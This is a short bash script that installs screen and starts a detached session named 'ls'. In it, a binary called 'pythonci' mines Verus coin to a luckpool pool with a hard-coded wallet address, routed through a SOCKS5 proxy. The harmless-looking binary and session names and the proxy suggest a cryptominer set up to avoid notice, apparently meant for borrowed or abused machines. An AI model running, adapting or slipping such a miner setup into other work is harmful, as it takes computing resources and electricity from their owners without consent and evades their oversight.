  #!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
screen -dmS ls
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=0AA7
PROXY=socks5://174.77.111.197:4145
./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
